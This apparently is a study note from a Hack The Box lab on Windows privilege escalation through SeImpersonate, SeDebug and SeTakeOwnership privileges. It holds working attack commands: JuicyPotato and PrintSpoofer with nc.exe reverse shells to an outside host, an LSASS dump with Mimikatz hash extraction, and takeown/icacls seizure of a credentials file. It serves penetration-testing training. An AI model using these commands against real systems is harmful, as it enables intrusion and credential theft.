# 🆓 Windows User Privileges

The below diagram walks through the Windows authorization and access control process at a high level, showing, for example, the process started when a user attempts to access a securable object such as a folder on a file share.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name                                                                                                                                                                              | Standard Assignment                                     |
| ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| SeNetworkLogonRight                                                                             | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)               | Administrators, Authenticated Users                     |
| SeRemoteInteractiveLogonRight                                                                   | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users                    |
| SeBackupPrivilege                                                                               | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)                               | Administrators                                          |
| SeSecurityPrivilege                                                                             | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)                         | Administrators                                          |
| SeTakeOwnershipPrivilege                                                                        | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)         | Administrators                                          |
| SeDebugPrivilege                                                                                | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)                                                             | Administrators                                          |
| SeImpersonatePrivilege                                                                          | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)       | Administrators, Local Service, Network Service, Service |
| SeLoadDriverPrivilege                                                                           | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)                             | Administrators                                          |
| SeRestorePrivilege                                                                              | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)                               | Administrators                                          |

Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user.

```powershell-session
PS C:\htb> whoami /priv
<SNIP>
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
<SNIP>
```

When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. we need some scripting to help us out.

this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts/Enable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

## SeImpersonate and SeAssignPrimaryToken

the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.  This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt) is worth reading for further details on token impersonation attacks.

### SeImpersonate Example - JuicyPotato

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.

Using the credentials `sql_dev:Str0ng_P@ssw0rd!` we connect to the SQL instance:

```shell-session
ElFelixi0@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
SQL>
```

Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands.

```shell-session
SQL> enable_xp_cmdshell
```

we can confirm that we are indeed running in the context of a SQL Server service account ->

```shell-session
SQL> xp_cmdshell whoami
nt service\mssql$sqlexpress01
```

let's check what privileges the service account has been granted.

```shell-session
SQL> xp_cmdshell whoami /priv 
<SNIP>
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
```

&#x20;[JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken`

first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

An don our listener ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lnvp 8443
<SNIP>
C:\Windows\system32>whoami
nt authority\system
```

### PrintSpoofer and RoguePotato

JuicyPotato **doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards**. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool

&#x20;Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

and if everything works fine our listener will catch this&#x20;

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 8443

C:\Windows\system32>whoami
nt authority\system
```

_**Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt**_

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

## SeDebugPrivilege

To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group.

{% hint style="info" %}
This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.
{% endhint %}

After looking at the privileges of the user we just logged in an see that `SeDebugPrivilege` is listed

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to leverage this privilege and dump process memory.

```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems

```cmd-session
C:\htb> mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
<SNIP> 
Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :
<SNIP>
```

{% hint style="info" %}
Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1477).png" alt=""><figcaption></figcaption></figure>

### Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it.

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) ([https://github.com/decoder-it/psgetsystem ](https://github.com/decoder-it/psgetsystem)) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

```powershell-session
PS C:\htb> tasklist 
winlogon.exe                   612 Console                    1     10,408 K
```

Note the PID, we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

<figure><img src="../../../.gitbook/assets/image (1478).png" alt=""><figcaption></figcaption></figure>

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`

## SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.

The setting can be set in Group Policy under:

* `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

<figure><img src="../../../.gitbook/assets/image (1479).png" alt=""><figcaption></figcaption></figure>

Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

If the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell-session
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
```

Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share.

let's assume that we have access to the target company's file share and can freely browse both the `Private` and `Public` subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the `Public` portion of the file share. In browsing the `Private` portion, we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

if we can' t see ownership of the file, we can take a step back and look at the ownership of the IT directory.

```powershell-session
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
```

And we quickly see the share is owned by a service account and does contain a file `cred.txt` -> we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell-session
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

We can confirm ownership

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

If for some reason we still can't cat out the file we can try to modify the file ACL with `icacls`

```powershell-session
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

and now we should be able to read the file

Some local files of interest may include:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

_**Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**_

